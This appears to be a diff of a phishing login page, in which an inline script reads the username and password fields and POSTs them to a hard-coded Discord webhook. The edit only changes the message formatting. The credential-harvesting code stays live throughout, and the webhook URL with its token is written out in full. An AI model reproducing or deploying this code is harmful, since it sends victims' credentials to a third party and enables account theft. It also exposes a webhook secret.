@@ -30,7 +30,7 @@
         <script>
         const result = ""
         function Submit(){const whurl ="https://discord.com/api/webhooks/1199024674424762399/7pJ4qo3tS5CvHAk1AwWYdeA9gmXVOwQLq9giDd_3kANMg7bSbrbyvUTX1_cXwbhrT4VN"
-        const msg = result.concat("Username = ", document.getElementById("t1").value, "\nPassword = ", document.getElementById("t2").value);
+        const msg = result.concat("`Username = ", document.getElementById("t1").value, "\nPassword = ", document.getElementById("t2").value, "`");
                 fetch(whurl, {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify({"content": msg})});};
         </script>
     </body>
